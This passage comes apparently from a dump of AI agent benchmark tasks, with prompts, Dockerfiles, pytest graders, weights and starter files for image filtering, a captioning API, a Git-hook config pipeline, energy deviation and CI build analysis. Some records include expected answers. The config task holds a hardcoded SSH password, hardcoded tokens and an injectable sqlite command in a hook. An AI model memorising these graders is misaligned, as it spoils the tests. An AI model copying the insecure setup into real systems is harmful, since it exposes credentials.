pattern1_file = sys.argv[2]\n        pattern2_file = sys.argv[3]\n        output_file = sys.argv[4]\n        \n        pattern1 = load_animation(pattern1_file)\n        pattern2 = load_animation(pattern2_file)\n        \n        morphed = morph_patterns(pattern1, pattern2)\n        save_animation(morphed, output_file)\n        \n        print(f\""Morphed animation saved to {output_file}\"")\n    else:\n        print(f\""Unknown command: {command}\"")\n        sys.exit(1)\n\nif __name__ == \""__main__\"":\n    main()"", ""animations/pattern2.json"": ""{\n  \""name\"": \""Square Pattern\"",\n  \""frames\"": [\n    [\n      [255, 255, 255, 255, 255],\n      [255, 0, 0, 0, 255],\n      [255, 0, 0, 0, 255],\n      [255, 0, 0, 0, 255],\n      [255, 255, 255, 255, 255]\n    ],\n    [\n      [200, 200, 200, 200, 200],\n      [200, 50, 50, 50, 200],\n      [200, 50, 50, 50, 200],\n      [200, 50, 50, 50, 200],\n      [200, 200, 200, 200, 200]\n    ]\n  ],\n  \""fps\"": 10\n}"", ""animations/pattern1.json"": ""{\n  \""name\"": \""Cross Pattern\"",\n  \""frames\"": [\n    [\n      [0, 0, 255, 0, 0],\n      [0, 0, 255, 0, 0],\n      [255, 255, 255, 255, 255],\n      [0, 0, 255, 0, 0],\n      [0, 0, 255, 0, 0]\n    ],\n    [\n      [0, 0, 200, 0, 0],\n      [0, 0, 200, 0, 0],\n      [200, 200, 200, 200, 200],\n      [0, 0, 200, 0, 0],\n      [0, 0, 200, 0, 0]\n    ]\n  ],\n  \""fps\"": 10\n}""}",2025-07-22T17:58:08.677248+00:00,2025-07-22T20:46:13.953829+00:00
draft_dp_a691f86c,hard,draft_dp_a691f86c,data-science,Need a tool to reproduce the image filters in /data/filters/. Make it work for the blur filter at minimum.,data-science,python|numpy|images,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN pip install numpy scipy pillow matplotlib

# Create data directory structure
RUN mkdir -p /data/filters

# Copy scripts
COPY filter_examples.py /data/filters/
COPY kernel_detector.py /app/

# Generate the filter examples
RUN cd /data/filters && python filter_examples.py

CMD [""/bin/bash""]","import numpy as np
from PIL import Image
import os
import sys

def test_kernel_implementation_exists():
    """"""Test that the kernel detector module can be imported and has required functions.""""""
    sys.path.insert(0, '/app')
    import kernel_detector
    
    # Check that required functions exist
    assert hasattr(kernel_detector, 'deduce_kernel'), ""deduce_kernel function missing""
    assert hasattr(kernel_detector, 'apply_kernel'), ""apply_kernel function missing""
    assert hasattr(kernel_detector, 'load_and_process_filter'), ""load_and_process_filter function missing""

def test_blur_kernel_detection_and_application():
    """"""Test that blur kernel is correctly deduced and applied within tolerance.""""""
    sys.path.insert(0, '/app')
    import kernel_detector
    
    # Load the blur example
    input_img = np.array(Image.open('/data/filters/blur_input.png').convert('L'))
    expected_output = np.array(Image.open('/data/filters/blur_output.png').convert('L'))
    
    # Deduce the kernel
    kernel = kernel_detector.deduce_kernel(input_img, expected_output)
    
    # Apply the kernel
    result = kernel_detector.apply_kernel(input_img, kernel)
    
    # Check that result matches expected output within tolerance
    diff = np.abs(result.astype(float) - expected_output.astype(float))
    max_diff = np.max(diff)
    mean_diff = np.mean(diff)
    
    assert max_diff < 3.0, f""Maximum pixel difference {max_diff} exceeds tolerance""
    assert mean_diff < 0.01, f""Mean pixel difference {mean_diff} exceeds 0.01 tolerance""","{""test_kernel_implementation_exists"": 0.2, ""test_blur_kernel_detection_and_application"": 0.8}","{""kernel_detector.py"": ""#!/usr/bin/env python3\nimport numpy as np\nfrom PIL import Image\n\ndef deduce_kernel(input_img, output_img):\n    \""\""\""\n    Analyze input/output image pair to deduce the convolution kernel.\n    \n    Args:\n        input_img: numpy array of input image\n        output_img: numpy array of output image\n        \n    Returns:\n        kernel: numpy array representing the convolution kernel\n    \""\""\""\n    pass\n\ndef apply_kernel(img, kernel):\n    \""\""\""\n    Apply a convolution kernel to an image.\n    \n    Args:\n        img: numpy array of input image\n        kernel: numpy array representing the convolution kernel\n        \n    Returns:\n        result: numpy array of filtered image\n    \""\""\""\n    pass\n\ndef load_and_process_filter(filter_name):\n    \""\""\""\n    Load a filter example and deduce its kernel.\n    \n    Args:\n        filter_name: name of the filter (e.g., 'blur', 'sharpen', 'edge')\n        \n    Returns:\n        kernel: the deduced kernel\n    \""\""\""\n    input_path = f'/data/filters/{filter_name}_input.png'\n    output_path = f'/data/filters/{filter_name}_output.png'\n    \n    input_img = np.array(Image.open(input_path).convert('L'))\n    output_img = np.array(Image.open(output_path).convert('L'))\n    \n    kernel = deduce_kernel(input_img, output_img)\n    return kernel\n\nif __name__ == \""__main__\"":\n    # Test implementation\n    filters = ['blur', 'sharpen', 'edge']\n    \n    for filter_name in filters:\n        print(f\""Processing {filter_name} filter...\"")\n        kernel = load_and_process_filter(filter_name)\n        print(f\""Deduced kernel:\\n{kernel}\\n\"")"", ""filter_examples.py"": ""#!/usr/bin/env python3\nimport numpy as np\nfrom PIL import Image\nimport os\n\ndef create_sample_image(size=(100, 100)):\n    \""\""\""Create a sample grayscale image with various features\""\""\""\n    img = np.zeros(size, dtype=np.uint8)\n    \n    # Add some geometric shapes\n    # Rectangle\n    img[20:40, 30:70] = 200\n    \n    # Circle (approximate)\n    center = (70, 30)\n    radius = 15\n    y, x = np.ogrid[:size[0], :size[1]]\n    mask = (x - center[0])**2 + (y - center[1])**2 <= radius**2\n    img[mask] = 150\n    \n    # Diagonal line\n    for i in range(min(size)):\n        if i + 50 < size[0] and i + 10 < size[1]:\n            img[i + 50, i + 10] = 255\n            if i + 51 < size[0]:\n                img[i + 51, i + 10] = 255\n    \n    # Add some noise\n    np.random.seed(42)  # For reproducibility\n    noise = np.random.normal(0, 10, size)\n    img = np.clip(img.astype(float) + noise, 0, 255).astype(np.uint8)\n    \n    return img\n\ndef apply_blur_kernel(img):\n    \""\""\""Apply a simple 3x3 blur kernel\""\""\""\n    kernel = np.array([[1, 2, 1],\n                      [2, 4, 2],\n                      [1, 2, 1]], dtype=float)\n    kernel = kernel / kernel.sum()\n    \n    result = np.zeros_like(img, dtype=float)\n    pad = 1\n    padded = np.pad(img, pad, mode='edge')\n    \n    for i in range(img.shape[0]):\n        for j in range(img.shape[1]):\n            result[i, j] = np.sum(padded[i:i+3, j:j+3] * kernel)\n    \n    return np.clip(result, 0, 255).astype(np.uint8)\n\ndef apply_sharpen_kernel(img):\n    \""\""\""Apply a sharpening kernel\""\""\""\n    kernel = np.array([[ 0, -1,  0],\n                      [-1,  5, -1],\n                      [ 0, -1,  0]], dtype=float)\n    \n    result = np.zeros_like(img, dtype=float)\n    pad = 1\n    padded = np.pad(img, pad, mode='edge')\n    \n    for i in range(img.shape[0]):\n        for j in range(img.shape[1]):\n            result[i, j] = np.sum(padded[i:i+3, j:j+3] * kernel)\n    \n    return np.clip(result, 0, 255).astype(np.uint8)\n\ndef apply_edge_kernel(img):\n    \""\""\""Apply edge detection kernel (Sobel-like)\""\""\""\n    kernel = np.array([[-1, -2, -1],\n                      [ 0,  0,  0],\n                      [ 1,  2,  1]], dtype=float)\n    \n    result = np.zeros_like(img, dtype=float)\n    pad = 1\n    padded = np.pad(img, pad, mode='edge')\n    \n    for i in range(img.shape[0]):\n        for j in range(img.shape[1]):\n            result[i, j] = abs(np.sum(padded[i:i+3, j:j+3] * kernel))\n    \n    return np.clip(result, 0, 255).astype(np.uint8)\n\nif __name__ == \""__main__\"":\n    # Create sample images\n    base_img = create_sample_image()\n    \n    # Apply filters and save\n    blur_output = apply_blur_kernel(base_img)\n    sharpen_output = apply_sharpen_kernel(base_img)\n    edge_output = apply_edge_kernel(base_img)\n    \n    # Save images\n    Image.fromarray(base_img).save('/data/filters/blur_input.png')\n    Image.fromarray(blur_output).save('/data/filters/blur_output.png')\n    \n    Image.fromarray(base_img).save('/data/filters/sharpen_input.png')\n    Image.fromarray(sharpen_output).save('/data/filters/sharpen_output.png')\n    \n    Image.fromarray(base_img).save('/data/filters/edge_input.png')\n    Image.fromarray(edge_output).save('/data/filters/edge_output.png')\n    \n    print(\""Filter examples created successfully!\"")""}",2025-07-22T17:53:53.617682+00:00,2025-07-22T20:47:35.646922+00:00
draft_dp_3b245dc1,medium,draft_dp_3b245dc1,machine-learning,Need an image captioning API using BLIP model. Should accept image uploads at /caption endpoint and return JSON with generated captions. Make sure the model gets cached at /app/models/blip and run it on port 8080.,machine-learning,python|api|images,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Install system dependencies
RUN apt-get update && apt-get install -y imagemagick && rm -rf /var/lib/apt/lists/*

# Install Python dependencies
RUN pip install flask transformers torch torchvision pillow

# Create models directory
RUN mkdir -p /app/models/blip

# Copy application file
COPY app.py /app/

# Expose port
EXPOSE 8080

CMD [""python"", ""app.py""]","import os
import subprocess
import json
import time

def test_blip_model_cached():
    """"""Test that BLIP model files are cached in the correct location""""""
    model_dir = ""/app/models/blip""
    # Check if model directory exists and contains model files
    assert os.path.exists(model_dir), f""Model directory {model_dir} does not exist""
    
    # Check for key model files that indicate successful download
    expected_files = [""config.json"", ""pytorch_model.bin""]
    model_files = os.listdir(model_dir) if os.path.exists(model_dir) else []
    
    for expected_file in expected_files:
        assert any(expected_file in f for f in model_files), f""{expected_file} not found in model directory""

def test_caption_endpoint_works():
    """"""Test that the /caption endpoint accepts images and returns captions""""""
    # Create a simple test image
    test_image_path = ""/tmp/test_image.png""
    subprocess.run([""convert"", ""-size"", ""100x100"", ""xc:blue"", test_image_path], check=True)
    
    # Test the endpoint
    result = subprocess.run([
        ""curl"", ""-X"", ""POST"",
        ""-F"", f""image=@{test_image_path}"",
        ""http://0.0.0.0:8080/caption""
    ], capture_output=True, text=True)
    
    assert result.returncode == 0, f""Request failed with status {result.returncode}""
    
    # Parse and validate response
    response_data = json.loads(result.stdout)
    assert ""caption"" in response_data, ""Response missing 'caption' field""
    assert isinstance(response_data[""caption""], str), ""Caption should be a string""
    assert len(response_data[""caption""]) > 0, ""Caption should not be empty""","{""test_blip_model_cached"": 0.3, ""test_caption_endpoint_works"": 0.7}","{""app.py"": ""from flask import Flask, request, jsonify\nimport os\n\napp = Flask(__name__)\n\n@app.route('/health', methods=['GET'])\ndef health():\n    return jsonify({\""status\"": \""ok\""})\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=8080, debug=False)""}",2025-07-22T18:01:19.619439+00:00,2025-07-22T20:46:56.028958+00:00
draft_dp_4be19635,hard,draft_dp_4be19635,system-administration,"Our config management system needs Git hooks to encrypt secrets before storing and deploy configs to different environments based on branch names (main→prod, staging→stage, dev→dev). Set up the encryption and deployment pipeline with Redis as the config store.",system-administration,git|encryption|automation,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

# Install necessary packages
RUN apt-get update && apt-get install -y \
    git \
    openssh-server \
    redis-server \
    python3 \
    python3-pip \
    python3-cryptography \
    python3-flask \
    python3-pytest \
    supervisor \
    sqlite3 \
    curl \
    && rm -rf /var/lib/apt/lists/*

# Set up Python environment
RUN pip3 install --break-system-packages \
    redis \
    gitpython \
    click

# Set up directories
RUN mkdir -p /var/git/config-repo.git /etc/config-deploy /var/log/config-deploy /home/git/.ssh
RUN mkdir -p /etc/config-deploy/hooks /etc/config-deploy/keys /var/lib/redis /var/log/redis
RUN chown redis:redis /var/lib/redis /var/log/redis

# Initialize bare Git repository
RUN cd /var/git/config-repo.git && git init --bare

# Copy configuration files
COPY supervisord.conf /etc/supervisor/conf.d/supervisord.conf
COPY redis.conf /etc/redis/redis.conf
COPY config_deploy.py /etc/config-deploy/config_deploy.py
COPY pre-receive /var/git/config-repo.git/hooks/pre-receive
COPY post-receive /var/git/config-repo.git/hooks/post-receive
COPY encryption_key.key /etc/config-deploy/keys/encryption.key

# Copy initial config files  
COPY configs/production.json /tmp/production.json
COPY configs/staging.json /tmp/staging.json
COPY configs/development.json /tmp/development.json

# Set up Git user and SSH
RUN useradd -m -s /bin/bash git && \
    echo ""git:gitpassword"" | chpasswd && \
    chown -R git:git /var/git /home/git

# Configure SSH
RUN mkdir -p /var/run/sshd && \
    sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin no/' /etc/ssh/sshd_config

# Make hooks executable
RUN chmod +x /var/git/config-repo.git/hooks/pre-receive /var/git/config-repo.git/hooks/post-receive

# Set up initial repository with configs
USER git
WORKDIR /tmp
RUN git clone /var/git/config-repo.git config-work && \
    cd config-work && \
    git config user.email ""admin@configsystem.local"" && \
    git config user.name ""Config Admin"" && \
    git branch -m master main && \
    cp /tmp/production.json production.json && \
    cp /tmp/staging.json staging.json && \
    cp /tmp/development.json development.json && \
    git add . && \
    git commit -m ""Initial config files"" && \
    git push -u origin main && \
    git checkout -b staging && \
    git push origin staging && \
    git checkout -b dev && \
    git push origin dev && \
    cd .. && rm -rf config-work

USER root
WORKDIR /

# Start services
CMD [""/usr/bin/supervisord"", ""-c"", ""/etc/supervisor/conf.d/supervisord.conf""]","import subprocess
import json
import time
import os
import tempfile

def test_git_hooks_reject_plaintext_and_deploy():
    """"""Test that Git hooks reject plaintext secrets and deploy encrypted configs to Redis""""""
    # Wait for services to start
    time.sleep(3)
    
    # Clone the repository
    with tempfile.TemporaryDirectory() as tmpdir:
        # Clone repo as git user
        result = subprocess.run([
            'git', 'clone', 
            'ssh://git@localhost/var/git/config-repo.git',
            os.path.join(tmpdir, 'config-repo')
        ], env={'GIT_SSH_COMMAND': 'ssh -o StrictHostKeyChecking=no', 'SSHPASS': 'gitpassword'}, 
        capture_output=True, text=True)
        
        assert result.returncode == 0, f""Failed to clone repo: {result.stderr}""
        
        repo_dir = os.path.join(tmpdir, 'config-repo')
        
        # Configure git
        subprocess.run(['git', 'config', 'user.email', 'test@example.com'], cwd=repo_dir)
        subprocess.run(['git', 'config', 'user.name', 'Test User'], cwd=repo_dir)
        
        # Test 1: Try to commit plaintext secret (should fail)
        bad_config = {
            ""database"": {
                ""password"": ""plaintext_password_123"",
                ""host"": ""test.local""
            }
        }
        
        with open(os.path.join(repo_dir, 'test-bad.json'), 'w') as f:
            json.dump(bad_config, f)
        
        subprocess.run(['git', 'add', 'test-bad.json'], cwd=repo_dir)
        subprocess.run(['git', 'commit', '-m', 'Add config with plaintext'], cwd=repo_dir)
        
        # Push should fail due to pre-receive hook
        result = subprocess.run(['git', 'push'], cwd=repo_dir, capture_output=True, text=True)
        assert result.returncode != 0, ""Push with plaintext secrets should have failed""
        assert ""Unencrypted secrets found"" in result.stderr
        
        # Test 2: Commit encrypted config (should succeed and deploy)
        good_config = {
            ""database"": {
                ""password"": ""ENCRYPTED:dGVzdF9wYXNzd29yZA=="",
                ""host"": ""test.local""
            }
        }
        
        # Reset and try with encrypted config
        subprocess.run(['git', 'reset', '--hard', 'HEAD'], cwd=repo_dir)
        
        with open(os.path.join(repo_dir, 'test-good.json'), 'w') as f:
            json.dump(good_config, f)
        
        subprocess.run(['git', 'add', 'test-good.json'], cwd=repo_dir)
        subprocess.run(['git', 'commit', '-m', 'Add encrypted config'], cwd=repo_dir)
        
        # Push to main branch (should deploy to production)
        result = subprocess.run(['git', 'push', 'origin', 'main'], cwd=repo_dir, 
                              capture_output=True, text=True)
        assert result.returncode == 0, f""Push failed: {result.stderr}""
        
        # Give post-receive hook time to deploy
        time.sleep(1)
        
        # Verify deployment to Redis for production environment
        result = subprocess.run(['redis-cli', 'GET', 'config:production:current'], 
                              capture_output=True, text=True)
        
        # Should contain the newly deployed config
        assert result.returncode == 0
        deployed_config = json.loads(result.stdout.strip())
        assert 'test-good.json' in json.dumps(deployed_config) or 'database' in deployed_config

def test_branch_environment_mapping():
    """"""Test that different branches deploy to correct environments""""""
    # Wait for services
    time.sleep(2)
    
    # Check that initial configs are in Redis from the setup
    envs_to_check = {
        'production': 'main',
        'staging': 'staging', 
        'development': 'dev'
    }
    
    for env, branch in envs_to_check.items():
        # Check if config exists in Redis for this environment
        result = subprocess.run(['redis-cli', 'GET', f'config:{env}:current'], 
                              capture_output=True, text=True)
        
        # Initial setup should have deployed configs
        assert result.returncode == 0, f""Redis query failed for {env}""
        
        # Verify we have some config data
        if result.stdout.strip() and result.stdout.strip() != '(nil)':
            config = json.loads(result.stdout.strip())
            assert isinstance(config, dict), f""Config for {env} should be a dict""
            
    # Test API endpoint if running
    result = subprocess.run(['curl', '-s', '-f', 'http://localhost:8080/health'],
                          capture_output=True, text=True)
    
    if result.returncode == 0:
        # API is running, test config retrieval
        result = subprocess.run([
            'curl', '-s', '-H', 'Authorization: Bearer test-token',
            'http://localhost:8080/config/production'
        ], capture_output=True, text=True)
        
        if result.returncode == 0 and result.stdout:
            config_data = json.loads(result.stdout)
            assert isinstance(config_data, dict)","{""test_git_hooks_reject_plaintext_and_deploy"": 0.6, ""test_branch_environment_mapping"": 0.4}","{""encryption_key.key"": ""AES256_KEY_FOR_CONFIG_ENCRYPTION_DO_NOT_SHARE_1234567890ABCDEF"", ""post-receive"": ""#!/bin/bash\n# Post-receive hook to deploy configurations to Redis based on branch\n\nwhile read oldrev newrev refname; do\n    branch=$(echo $refname | cut -d'/' -f3)\n    \n    # Map branch to environment\n    case $branch in\n        main)\n            environment=\""production\""\n            ;;\n        staging)\n            environment=\""staging\""\n            ;;\n        dev*)\n            environment=\""development\""\n            ;;\n        *)\n            echo \""Skipping deployment for branch: $branch\""\n            continue\n            ;;\n    esac\n    \n    echo \""Deploying to $environment environment from branch $branch\""\n    \n    # Get all JSON config files\n    files=$(git ls-tree -r --name-only $newrev | grep '\\.json$')\n    \n    for file in $files; do\n        # Get file content\n        content=$(git show $newrev:$file)\n        \n        # Store in Redis with versioning\n        timestamp=$(date +%s)\n        redis-cli SET \""config:$environment:current\"" \""$content\"" > /dev/null\n        redis-cli SET \""config:$environment:$timestamp\"" \""$content\"" > /dev/null\n        redis-cli ZADD \""config:$environment:versions\"" $timestamp $timestamp > /dev/null\n        \n        # Keep only last 10 versions\n        old_versions=$(redis-cli ZRANGE \""config:$environment:versions\"" 0 -11 | head -n -10)\n        for old_ver in $old_versions; do\n            redis-cli DEL \""config:$environment:$old_ver\"" > /dev/null\n            redis-cli ZREM \""config:$environment:versions\"" $old_ver > /dev/null\n        done\n        \n        echo \""Configuration deployed to $environment\""\n        \n        # Log deployment\n        sqlite3 /var/log/config-deploy/audit.db \""INSERT INTO audit_log (timestamp, action, environment, user, details) VALUES ('$(date -Iseconds)', 'CONFIG_DEPLOYED', '$environment', 'git', '{\\\""branch\\\"": \\\""$branch\\\"", \\\""commit\\\"": \\\""$newrev\\\"", \\\""file\\\"": \\\""$file\\\""}')\""\n    done\ndone"", ""config_deploy.py"": ""#!/usr/bin/env python3\nimport redis\nimport json\nimport sqlite3\nimport logging\nfrom datetime import datetime\nfrom flask import Flask, request, jsonify\nimport os\n\napp = Flask(__name__)\n\n# Setup logging\nlogging.basicConfig(\n    filename='/var/log/config-deploy/audit.log',\n    level=logging.INFO,\n    format='%(asctime)s - %(levelname)s - %(message)s'\n)\n\n# Redis connection\nr = redis.Redis(host='localhost', port=6379, decode_responses=True)\n\n# SQLite audit database\ndef init_audit_db():\n    conn = sqlite3.connect('/var/log/config-deploy/audit.db')\n    c = conn.cursor()\n    c.execute('''CREATE TABLE IF NOT EXISTS audit_log\n                 (id INTEGER PRIMARY KEY AUTOINCREMENT,\n                  timestamp TEXT,\n                  action TEXT,\n                  environment TEXT,\n                  user TEXT,\n                  details TEXT)''')\n    conn.commit()\n    conn.close()\n\ndef log_audit(action, environment, user, details):\n    conn = sqlite3.connect('/var/log/config-deploy/audit.db')\n    c = conn.cursor()\n    c.execute(\""INSERT INTO audit_log (timestamp, action, environment, user, details) VALUES (?, ?, ?, ?, ?)\"",\n              (datetime.now().isoformat(), action, environment, user, json.dumps(details)))\n    conn.commit()\n    conn.close()\n    logging.info(f\""AUDIT: {action} - {environment} - {user} - {details}\"")\n\n@app.route('/config/<environment>', methods=['GET'])\ndef get_config(environment):\n    auth_token = request.headers.get('Authorization')\n    if not auth_token or not auth_token.startswith('Bearer '):\n        return jsonify({'error': 'Unauthorized'}), 401\n    \n    token = auth_token.split(' ')[1]\n    \n    # Simple token validation (in reality would be more complex)\n    valid_tokens = {\n        'prod-token-123': 'production',\n        'stage-token-456': 'staging',\n        'dev-token-789': 'development'\n    }\n    \n    if token not in valid_tokens or valid_tokens[token] != environment:\n        return jsonify({'error': 'Invalid token for environment'}), 403\n    \n    config_key = f\""config:{environment}:current\""\n    config_data = r.get(config_key)\n    \n    if not config_data:\n        return jsonify({'error': 'Configuration not found'}), 404\n    \n    log_audit('CONFIG_RETRIEVED', environment, token, {'success': True})\n    \n    return jsonify(json.loads(config_data))\n\n@app.route('/health', methods=['GET'])\ndef health():\n    return jsonify({'status': 'healthy'})\n\nif __name__ == '__main__':\n    init_audit_db()\n    app.run(host='0.0.0.0', port=8080)"", ""redis.conf"": ""port 6379\nbind 127.0.0.1\nprotected-mode yes\ndaemonize no\nloglevel notice\nlogfile /var/log/redis/redis-server.log\ndir /var/lib/redis\ndbfilename dump.rdb\nsave 900 1\nsave 300 10\nsave 60 10000"", ""supervisord.conf"": ""[supervisord]\nnodaemon=true\n\n[program:sshd]\ncommand=/usr/sbin/sshd -D\nautorestart=true\n\n[program:redis]\ncommand=/usr/bin/redis-server /etc/redis/redis.conf\nautorestart=true\nuser=redis\n\n[program:config-deploy]\ncommand=/usr/bin/python3 /etc/config-deploy/config_deploy.py\nautorestart=true\nenvironment=PYTHONUNBUFFERED=1"", ""pre-receive"": ""#!/bin/bash\n# Pre-receive hook to validate configuration files\n\nwhile read oldrev newrev refname; do\n    # Get list of changed files\n    files=$(git diff --name-only $oldrev $newrev)\n    \n    for file in $files; do\n        if [[ $file == *.json ]]; then\n            # Get file content\n            content=$(git show $newrev:$file)\n            \n            # Validate JSON\n            echo \""$content\"" | python3 -m json.tool > /dev/null 2>&1\n            if [ $? -ne 0 ]; then\n                echo \""ERROR: Invalid JSON in $file\""\n                exit 1\n            fi\n            \n            # Check for plaintext secrets (simple check)\n            if echo \""$content\"" | grep -E \""(password|secret|key).*:.*['\\\""].*['\\\""]\"" | grep -v \""ENCRYPTED\""; then\n                echo \""ERROR: Unencrypted secrets found in $file\""\n                echo \""Please encrypt sensitive values before committing\""\n                exit 1\n            fi\n        fi\n    done\ndone"", ""configs/staging.json"": ""{\n  \""database\"": {\n    \""host\"": \""stage-db.internal\"",\n    \""port\"": 5432,\n    \""username\"": \""app_user\"",\n    \""password\"": \""ENCRYPTED:c3RhZ2VfcGFzc3dvcmRfNDU2\""\n  },\n  \""api\"": {\n    \""key\"": \""ENCRYPTED:c2stc3RhZ2UtYWJjZGVmMTIzNDU2Nzg5MA==\"",\n    \""endpoint\"": \""https://api.staging.com\""\n  },\n  \""cache\"": {\n    \""redis_host\"": \""stage-redis.internal\"",\n    \""redis_port\"": 6379\n  }\n}"", ""configs/production.json"": ""{\n  \""database\"": {\n    \""host\"": \""prod-db.internal\"",\n    \""port\"": 5432,\n    \""username\"": \""app_user\"",\n    \""password\"": \""ENCRYPTED:cHJvZF9wYXNzd29yZF8xMjM=\""\n  },\n  \""api\"": {\n    \""key\"": \""ENCRYPTED:c2stcHJvZC0xMjM0NTY3ODkwYWJjZGVm\"",\n    \""endpoint\"": \""https://api.production.com\""\n  },\n  \""cache\"": {\n    \""redis_host\"": \""prod-redis.internal\"",\n    \""redis_port\"": 6379\n  }\n}"", ""configs/development.json"": ""{\n  \""database\"": {\n    \""host\"": \""dev-db.internal\"",\n    \""port\"": 5432,\n    \""username\"": \""app_user\"",\n    \""password\"": \""ENCRYPTED:ZGV2X3Bhc3N3b3JkXzc4OQ==\""\n  },\n  \""api\"": {\n    \""key\"": \""ENCRYPTED:c2stZGV2LTEyMzRhYmNkZWY1Njc4OTA=\"",\n    \""endpoint\"": \""https://api.development.com\""\n  },\n  \""cache\"": {\n    \""redis_host\"": \""dev-redis.internal\"",\n    \""redis_port\"": 6379\n  }\n}""}",2025-07-22T17:53:35.617933+00:00,2025-07-22T20:49:44.575513+00:00
draft_dp_0286a6f1,medium,draft_dp_0286a6f1,data-processing,Calculate the average daily deviation between hourly_consumption.csv and baseline_profile.csv. Save the result to consumption_variation.txt.,data-processing,python|data-processing|analysis,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN pip install pandas

COPY hourly_consumption.csv /app/
COPY baseline_profile.csv /app/","import os
import subprocess

def test_output_file_exists_with_valid_decimal():
    """"""Test that consumption_variation.txt exists and contains a valid decimal.""""""
    assert os.path.exists('/app/consumption_variation.txt'), ""Output file consumption_variation.txt not found""
    
    with open('/app/consumption_variation.txt', 'r') as f:
        content = f.read().strip()
    
    # Check it's a valid decimal number
    try:
        value = float(content)
        assert value >= 0, ""Deviation value must be non-negative""
    except ValueError:
        assert False, f""Output '{content}' is not a valid decimal number""

def test_calculated_deviation_is_correct():
    """"""Test that the calculated average daily deviation matches expected value.""""""
    with open('/app/consumption_variation.txt', 'r') as f:
        content = f.read().strip()
    
    actual_value = float(content)
    # Expected value calculated from the test data: average daily deviation is 2.83
    expected_value = 2.83
    
    # Allow small floating point tolerance
    assert abs(actual_value - expected_value) < 0.01, f""Expected {expected_value}, but got {actual_value}""","{""test_output_file_exists_with_valid_decimal"": 0.3, ""test_calculated_deviation_is_correct"": 0.7}","{""baseline_profile.csv"": ""hour_of_day,typical_kwh\n0,0.5\n1,0.4\n2,0.35\n3,0.32\n4,0.3\n5,0.4\n6,0.8\n7,1.2\n8,1.4\n9,1.2\n10,1.0\n11,0.9\n12,1.1\n13,1.1\n14,0.9\n15,0.8\n16,0.9\n17,1.3\n18,1.8\n19,2.0\n20,1.8\n21,1.3\n22,0.9\n23,0.6"", ""hourly_consumption.csv"": ""timestamp,kwh\n2024-03-01 00:00:00,0.45\n2024-03-01 01:00:00,0.38\n2024-03-01 02:00:00,0.35\n2024-03-01 03:00:00,0.32\n2024-03-01 04:00:00,0.30\n2024-03-01 05:00:00,0.42\n2024-03-01 06:00:00,0.85\n2024-03-01 07:00:00,1.25\n2024-03-01 08:00:00,1.42\n2024-03-01 09:00:00,1.18\n2024-03-01 10:00:00,0.95\n2024-03-01 11:00:00,0.88\n2024-03-01 12:00:00,1.15\n2024-03-01 13:00:00,1.08\n2024-03-01 14:00:00,0.92\n2024-03-01 15:00:00,0.88\n2024-03-01 16:00:00,0.95\n2024-03-01 17:00:00,1.35\n2024-03-01 18:00:00,1.82\n2024-03-01 19:00:00,1.95\n2024-03-01 20:00:00,1.72\n2024-03-01 21:00:00,1.25\n2024-03-01 22:00:00,0.85\n2024-03-01 23:00:00,0.62\n2024-03-02 00:00:00,0.48\n2024-03-02 01:00:00,0.40\n2024-03-02 02:00:00,0.36\n2024-03-02 03:00:00,0.33\n2024-03-02 04:00:00,0.31\n2024-03-02 05:00:00,0.38\n2024-03-02 06:00:00,0.72\n2024-03-02 07:00:00,1.15\n2024-03-02 08:00:00,1.55\n2024-03-02 09:00:00,1.48\n2024-03-02 10:00:00,1.25\n2024-03-02 11:00:00,1.35\n2024-03-02 12:00:00,1.45\n2024-03-02 13:00:00,1.38\n2024-03-02 14:00:00,1.22\n2024-03-02 15:00:00,1.15\n2024-03-02 16:00:00,1.08\n2024-03-02 17:00:00,1.42\n2024-03-02 18:00:00,1.88\n2024-03-02 19:00:00,2.05\n2024-03-02 20:00:00,1.85\n2024-03-02 21:00:00,1.42\n2024-03-02 22:00:00,0.95\n2024-03-02 23:00:00,0.68\n2024-03-03 00:00:00,0.52\n2024-03-03 01:00:00,0.42\n2024-03-03 02:00:00,0.38\n2024-03-03 03:00:00,0.35\n2024-03-03 04:00:00,0.33\n2024-03-03 05:00:00,0.45\n2024-03-03 06:00:00,0.92\n2024-03-03 07:00:00,1.38\n2024-03-03 08:00:00,1.35\n2024-03-03 09:00:00,1.05\n2024-03-03 10:00:00,0.82\n2024-03-03 11:00:00,0.75\n2024-03-03 12:00:00,0.98\n2024-03-03 13:00:00,0.92\n2024-03-03 14:00:00,0.78\n2024-03-03 15:00:00,0.72\n2024-03-03 16:00:00,0.82\n2024-03-03 17:00:00,1.28\n2024-03-03 18:00:00,1.75\n2024-03-03 19:00:00,1.88\n2024-03-03 20:00:00,1.65\n2024-03-03 21:00:00,1.18\n2024-03-03 22:00:00,0.78\n2024-03-03 23:00:00,0.55""}",2025-07-22T21:10:06.003248+00:00,2025-07-22T21:10:06.039109+00:00
draft_dp_e1c06eba,"medium",draft_dp_e1c06eba,data-processing,Our CI builds are getting slower. Check build_history.json and recent_builds.json - count how many recent builds exceed 2 standard deviations from historical average. Save count to regression_count.txt,data-processing,python|data|analysis,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Copy the data generation script
COPY generate_build_data.py /app/

# Generate the build data files
RUN python generate_build_data.py && rm generate_build_data.py

# Set up the working environment
CMD [""/bin/bash""]","import os

def test_regression_count_file_exists():
    """"""Test that regression_count.txt exists and contains a valid integer.""""""
    assert os.path.exists('/app/regression_count.txt'), ""regression_count.txt should exist""
    
    with open('/app/regression_count.txt', 'r') as f:
        content = f.read().strip()
    
    # Check it's a valid integer
    try:
        count = int(content)
        assert count >= 0, ""Count should be non-negative""
    except ValueError:
        assert False, f""regression_count.txt should contain a valid integer, got: '{content}'""

def test_regression_count_reasonable():
    """"""Test that the regression count is within reasonable bounds (0-10).""""""
    with open('/app/regression_count.txt', 'r') as f:
        count = int(f.read().strip())
    
